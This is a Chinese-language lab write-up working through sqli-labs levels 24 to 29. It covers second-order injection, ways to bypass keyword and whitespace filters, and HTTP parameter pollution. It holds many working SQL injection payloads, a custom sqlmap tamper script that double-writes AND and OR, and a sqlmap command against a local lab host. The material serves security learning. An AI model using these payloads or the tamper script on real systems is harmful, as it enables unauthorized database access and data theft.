<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，update语句中，使用了从数据库中查询出来的，没有过滤（转义）的数据，来拼接成为新的 sql 语句。所以此处可能存在二次注入</p>
<p>二次注入简单举个例子，假设我们创建一个用户，用户名为 <code>  &#39; or 1=1#</code> ，因为插入之前单引号经过转义，所以生成的sql语句是（假设密码为 123）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users ( username, password) <span class="keyword">values</span>(&quot;\&#x27; or 1=1#&quot;, &quot;123&quot;)</span><br></pre></td></tr></table></figure>

<p>此时再从数据库中获取刚插入的数据，用户名为 <code> &#39; or 1=1#</code> ，转义时生成的反引号就没了，如果此时我们将密码修改为 456，生成的sql语句为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;456&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#<span class="string">&#x27; and password=&#x27;</span>$curr_pass<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以修改所有用户的密码，当然想要只修改一个用户的也可以做到，比如 admin，注册时用户名为 <code>admin&#39;#</code> 即可</p>
<h1 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h1><p>过滤 and 和 or，大小写不敏感</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p>解决办法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> =&gt; ||</span><br><span class="line"><span class="keyword">and</span> =&gt; &amp;&amp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者双写绕过</span></span><br></pre></td></tr></table></figure>

<p>用运算符代替and和or有一个问题，比如 information 这个单词会被过滤成 infmation，or即使不是用作或运算也会过滤掉，不知道这种怎么处理（感觉这种过滤不是很合理，正常的输入都可能会被过滤掉。正则表达式可能可以改进）</p>
<p>这种把关键字替换成空字符串，如果只替换一次（不是一直替换，直到最终字符串中没有那些关键字为止），双写就可以绕过，比如  AANDND 过滤后为 AND</p>
<p>sqlmap 如果加上 tamper 就能绕过这些过滤。tamper 是用来绕过过滤的（waf），比如将空格替换成 /**/ 绕过空格过滤。less-25 双写绕过，网上说有个tamper 脚本叫 nonrecursivereplacement.py 非递归替换，意思挺明了的，好像效果就是双写绕过，但我没有在我下载的 sqlmap 的 tamper 目录中找到这个脚本，只找到了 symboliclogical ，就那个有问题的方法。不知道是要额外去哪下载tamper，还是因为版本更新删除了这个。</p>
<p>因为 or =&gt; || 和 or =&gt; oorr 很像，而且 sqlmap 的payload中，and和or一般都是大写，于是我直接拿 symboliclogical.py 改成了or和and双写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    double write, OR =&gt; OORR , AND =&gt; AANDND</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span></span><br><span class="line"><span class="string">    &quot;1 AANDND &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;AND&#x27;</span>, <span class="string">&#x27;AANDND&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;OR&#x27;</span>, <span class="string">&#x27;OORR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>只要改变tamper中的代码，文件名为 mydoublewrite.py 。避免使用耗费大量时间的时间盲注，指定注入的方法（联合注入，报错注入，布尔注入，堆叠注入），–tamper 指定 tamper</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">25</span>/?id=<span class="number">123</span> --tamper=mydoublewrite --technique=UEBS -D security --tables</span><br></pre></td></tr></table></figure>



<h1 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h1><p>好像就字符型换成了数字型，sqlmap使用命令与less-25相同</p>
<h1 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h1><p>先看一眼过滤了什么</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了前两个（and和or），其他过滤的关键字都是放在中括号中的，表示只要有中括号中的字符就替换成空（php的正则表达式不太熟，python中应该是这样的，四个反斜杠表示替换一个反斜杠，这么多是因为要转义），所以是单字符被替换掉，无法使用双写绕过。</p>
<p>过滤空格本来可以使用 <code>/**/</code> 绕过，但这里 * 和 / 都过滤了。还可以用括号绕过，如下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>  =&gt;  select(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>本关可以用报错注入</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;aandnd(extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span>(<span class="keyword">database</span>())))))aandnd<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span>aandnd(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(infoorrmation_schema.columns)))aandnd<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=&#x27;</span>aandnd(extractvalue(<span class="number">0x0a</span>,concat(<span class="number">0x0a</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_schema=<span class="string">&#x27;security&#x27;</span>)aandnd(table_name=<span class="string">&#x27;users&#x27;</span>)))))aandnd<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>联合注入（<del>and换成了&amp;&amp;就报错了？</del> 应该是要url编码）用零字节截断后面的sql语句</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;union(<span class="keyword">select</span>(<span class="number">1</span>),group_concat(column_name),(<span class="number">3</span>)<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_schema=<span class="string">&#x27;security&#x27;</span>)aandnd(table_name=<span class="string">&#x27;users&#x27;</span>));%00</span><br></pre></td></tr></table></figure>



<p>盲注看26a</p>
<p>这关过滤的是空白，不止空格，空白还包括水平制表符（\t %09）换行等</p>
<h1 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h1><p>适用于mysql，其他dbms没怎么研究</p>
<p>用sqli-labs中的users表来举例子</p>
<h2 id="1、用-代替"><a href="#1、用-代替" class="headerlink" title="1、用 /**/ 代替"></a>1、用 <code>/**/</code> 代替</h2><p>/* 和 */中间的内容为注释</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="keyword">USER</span>(),DATABASE();</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>username,password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>users<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(table_name),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这种如果要写脚本比较简单，空格和/**/是一一对应的</p>
<h2 id="2、圆括号"><a href="#2、圆括号" class="headerlink" title="2、圆括号"></a>2、圆括号</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(<span class="number">1</span>),(<span class="number">2</span>),(<span class="number">3</span>)<span class="keyword">FROM</span>(users);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(username),(password)<span class="keyword">from</span>(users)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>(username),(password)<span class="keyword">FROM</span>(users)<span class="keyword">WHERE</span>(id<span class="operator">=</span><span class="number">-1</span>)<span class="keyword">UNION</span>(<span class="keyword">SELECT</span>(GROUP_CONCAT(COLUMN_NAME)),(<span class="number">2</span>)<span class="keyword">FROM</span>(information_schema.columns)<span class="keyword">WHERE</span>(table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>)<span class="keyword">AND</span>(TABLE_NAME<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>));</span><br></pre></td></tr></table></figure>



<h2 id="3、反引号"><a href="#3、反引号" class="headerlink" title="3、反引号"></a>3、反引号</h2><p>反引号 (`) 在mysql中用于区分保留字和一般的字符串，反引号中的字符串一般是列名或者表名，反引号中的关键字不会被认为是关键字，比如反引号中的函数不会执行，感觉局限性比较大</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>`username`,`password`<span class="keyword">FROM</span>`users`;</span><br></pre></td></tr></table></figure>

<p>有些dbms好像用的是中括号[ ]</p>
<h2 id="4、一种mysql中比较特殊的注释"><a href="#4、一种mysql中比较特殊的注释" class="headerlink" title="4、一种mysql中比较特殊的注释"></a>4、一种mysql中比较特殊的注释</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*! xxxxx select 1,2,3*/</span></span><br></pre></td></tr></table></figure>

<p>其中 xxxxx （5位） 代表mysql的版本号，只要使用的mysql版本号比 xxxxx 大，就执行注释中的语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span><span class="comment">/*!00000username,password*/</span><span class="keyword">FROM</span><span class="comment">/*!00000users*/</span>;</span><br></pre></td></tr></table></figure>



<p>网上还有说 %a0 绕过的，好像和操作系统还是中间件有关系（好像要服务器是linux，%a0好像是 &amp;nbsp，html实体编码）</p>
<p>应该还有别的方法，but 我好菜啊</p>
<h1 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h1><p>用 %00 的话，多个括号</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;)union(<span class="keyword">select</span>(<span class="number">1</span>),group_concat(column_name),(<span class="number">3</span>)<span class="keyword">from</span>(infoorrmation_schema.columns)<span class="keyword">where</span>(table_schema=<span class="string">&#x27;security&#x27;</span>)aandnd(table_name=<span class="string">&#x27;users&#x27;</span>));%00</span><br></pre></td></tr></table></figure>

<p>不用的话</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?i</span>d=<span class="string">&#x27;)||(if(1=1,sleep(1),0))||(&#x27;</span></span><br></pre></td></tr></table></figure>

<p>tamper不会写，<del>呜呜呜</del></p>
<h1 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这正则表达式区分大小写，可以改变几个字母的大小写来绕过，如果不改的话，select过滤了两次，要多加一个select</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="symbol">&#x27;uunionnion</span>(ssselectelectelect(<span class="number">1</span>),group_concat(column_name),(<span class="number">3</span>)from(information_schema.columns)<span class="keyword">where</span>(table_schema=<span class="symbol">&#x27;security</span>&#x27;)and(table_name=<span class="string">&#x27;users&#x27;</span>));%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>仔细看一下，这次过滤的不是空白，只过滤空格，所以可以用其他空白字符替代空格</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x09</span>	<span class="constructor">HT(<span class="params">horizontal</span> <span class="params">tab</span>)</span>	水平制表符</span><br><span class="line"><span class="number">0x0A</span>	<span class="constructor">LF(<span class="params">line</span> <span class="params">feed</span>)</span>		换行</span><br><span class="line"><span class="number">0x0B</span>	<span class="constructor">VT(<span class="params">vertical</span> <span class="params">tab</span>)</span>	垂直制表符</span><br><span class="line"><span class="number">0x0C</span>	<span class="constructor">FF(<span class="params">form</span> <span class="params">feed</span>)</span>		换页</span><br><span class="line"><span class="number">0x0D</span>	<span class="constructor">CR(<span class="params">carriage</span> <span class="params">return</span>)</span>	回车</span><br><span class="line"></span><br><span class="line"># 以上描述来源网络</span><br><span class="line"># url编码前一部分应该是和ASCII码一样的，就把 <span class="number">0x09</span> 换成 %<span class="number">09</span></span><br></pre></td></tr></table></figure>

<p>我们改变大小写，并用其他空白字符代替空格</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>&#x27;<span class="variable">%09</span>uNion<span class="variable">%0</span>aseleCt<span class="variable">%0</span>b<span class="number">1</span><span class="punctuation">,</span>group_concat(column_name)<span class="punctuation">,</span><span class="number">3</span><span class="variable">%0</span>cfrom<span class="variable">%0</span>dinformation_schema.columns<span class="variable">%09</span>where<span class="variable">%09</span>table_schema<span class="operator">=</span>&#x27;security&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>table_name<span class="operator">=</span>&#x27;users&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h1><p>第一个和最后一个单引号换成双引号</p>
<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><p>双写的部分长一点，括号闭合一下</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>&#x27;)<span class="variable">%09</span>uniunion<span class="variable">%09</span>selecton<span class="variable">%09</span><span class="keyword">select</span><span class="variable">%0</span>b<span class="number">1</span><span class="punctuation">,</span>group_concat(column_name)<span class="punctuation">,</span><span class="number">3</span><span class="variable">%0</span>cfrom<span class="variable">%0</span>dinformation_schema.columns<span class="variable">%09</span>where<span class="variable">%09</span>table_schema<span class="operator">=</span>&#x27;security&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>table_name<span class="operator">=</span>&#x27;users&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>(&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>过滤的关键字更少了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p>\s 表示空白，\s+ 表示 一个或一个以上的空白</p>
<p>\**\ 不是空白</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>&#x27;)<span class="variable">%09</span>union/**/<span class="keyword">select</span><span class="variable">%0</span>b<span class="number">1</span><span class="punctuation">,</span>group_concat(column_name)<span class="punctuation">,</span><span class="number">3</span><span class="variable">%0</span>cfrom<span class="variable">%0</span>dinformation_schema.columns<span class="variable">%09</span>where<span class="variable">%09</span>table_schema<span class="operator">=</span>&#x27;security&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>table_name<span class="operator">=</span>&#x27;users&#x27;<span class="variable">%09</span><span class="keyword">and</span><span class="variable">%09</span>(&#x27;<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h1><p>index.php 中没有过滤，和 less-1 差不多吧</p>
<p>login.php 中白名单过滤，但他这个感觉是有点问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$qs</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="variable">$hint</span>=<span class="variable">$qs</span>;</span><br><span class="line"><span class="variable">$id1</span>=java_implimentation(<span class="variable">$qs</span>);  <span class="comment">// 根据 &amp; 分割查询字符串</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  <span class="comment">// 检查的和使用的字符串并不完全相同</span></span><br><span class="line">whitelist(<span class="variable">$id1</span>);  <span class="comment">// 检查分割后的是否为纯数字</span></span><br></pre></td></tr></table></figure>

<p>whitelist，以数字开头结尾，一个或一个以上数字</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br></pre></td></tr></table></figure>

<p>一开始想直接 <code>id=65535&amp;&#39;union select 1,2,3--+</code> 但从 $_GET 中取id参数，取出来的值也只有 &amp; 前面的，后来再试了一下 url编码，把 &amp; 换成 %26，但也不行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];  <span class="comment">// 不经过 url 解码</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  <span class="comment">// 经过 url 解码</span></span><br></pre></td></tr></table></figure>

<p>比如</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?id</span>=<span class="number">65535</span><span class="meta">%26id</span>=<span class="string">&#x27;union select 1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$_GET[&#x27;</span>id<span class="string">&#x27;];  // 65535&amp;&#x27;</span><span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];  //<span class="built_in"> id</span>=<span class="number">65535</span><span class="meta">%26</span><span class="meta">%27union</span><span class="meta">%20select</span><span class="meta">%201</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>



<h2 id="尝试覆盖变量（HTTP-Parameter-Pollution）"><a href="#尝试覆盖变量（HTTP-Parameter-Pollution）" class="headerlink" title="尝试覆盖变量（HTTP Parameter Pollution）"></a>尝试覆盖变量（HTTP Parameter Pollution）</h2><p>我们尝试在 url 中传递两个 id 参数</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">65535</span>&amp;id=<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>whitelist 函数中检查的是第一个找到的 id，至于 $_GET[‘id’] 会是第一个第二个还是别的什么不太清楚。试了一下，应该是第二个id</p>
<p>后来发现，注释里面写了 HTTP Parameter Pollution（HTTP 参数污染），php是取最后一个参数，不同的语言可能会有不同的结果</p>
